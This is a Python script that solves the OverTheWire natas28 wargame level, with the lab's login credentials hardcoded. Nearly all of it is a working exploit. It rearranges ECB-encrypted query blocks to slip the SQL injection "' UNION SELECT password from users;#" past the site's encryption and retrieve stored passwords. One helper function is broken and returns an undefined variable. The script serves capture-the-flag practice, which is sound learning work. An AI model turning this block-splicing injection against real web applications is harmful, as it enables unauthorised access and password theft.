# -*- coding: utf-8 -*-
import os
import requests
import base64
import urllib2
import urllib
def make_request(url,auth,query):
        r = requests.post(url, auth=auth,data=query,allow_redirects=True)
        return r
def get_cipher(url):
        try:
            cipher = base64.b64decode(requests.utils.unquote(url.split('query=')[1]))
            return cipher
        except Exception as e:
            print("Error in parsing URL")
            return None
        return
        
def init_pad(ch,num):
        a = ch * num
        return a
        
def find_block_param(url, auth):
        bs_ctr = 0
        len_list = []
        qry_list = []
        s_list = []
        print("Starting queries")
        for i in range(1,10):
            resp = make_request(url,auth,{"query":'a'*i})
            qry = get_cipher(resp.url)
            print base64.b64encode(qry)
            len_list.append(len(qry))
            s_list.append(len('a'*i))
            qry_list.append(base64.b64encode(qry))
        print("All queries done")
        set_list = list(set(len_list))
        block_size = set_list[1] - set_list[0]
        first_block = len_list.count(set_list[0])
        return first_block, block_size, common_length
           
            
def main():
        url = 'http://natas28.natas.labs.overthewire.org/'
        injection_url = url + 'search.php/?query='
        auth = requests.auth.HTTPBasicAuth('natas28','JWwR438wkgTsNKBbcJoowyysdM82YjeF')
        sterm = 'query'
        
        block_size = 16
        block_completion_str = init_pad(" ",10) 
        ref_query = get_cipher(make_request(url,auth,{sterm:block_completion_str}).url)
        first_part = ref_query[:3*block_size]
        last_part = ref_query[3*block_size:]
       
        injection_qry = init_pad(' ',9) + "' UNION SELECT password from users;#" 
        injection = get_cipher(make_request(url,auth,{sterm:injection_qry}).url)
        injection_size = (len(injection_qry))/block_size
        if((len(injection_qry)-(10))%block_size!=0): 
            injection_size += 1
        final_query = first_part + injection[3*block_size:(3*block_size + (injection_size*block_size))] + last_part
        final_query = requests.utils.quote(base64.b64encode(final_query)).replace('/','%2F')
        attack_resp = requests.get(injection_url+final_query,auth=auth)
        print attack_resp.text
        return
if __name__ == '__main__':
        main()
